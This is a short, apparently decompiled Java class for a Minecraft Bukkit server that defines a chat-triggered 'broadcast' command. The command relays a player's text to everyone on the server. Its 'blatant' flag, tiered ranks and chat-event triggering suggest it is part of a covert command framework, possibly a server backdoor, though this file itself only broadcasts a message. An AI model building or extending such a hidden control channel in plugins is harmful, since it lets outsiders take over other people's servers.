package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import org.bukkit.Bukkit;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "broadcast",
   description = "Broadcast a message publicly",
   blatant = false,
   rank = Rank.FREE,
   aliases = {"bc"}
)
public class BroadcastCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      StringBuilder var4 = new StringBuilder();

      for(String var8 : var3) {
         var4.append(var8).append(" ");
      }

      Bukkit.broadcastMessage(var4.toString().replace("&", "§"));
   }

   public BroadcastCommand() {
   }
}
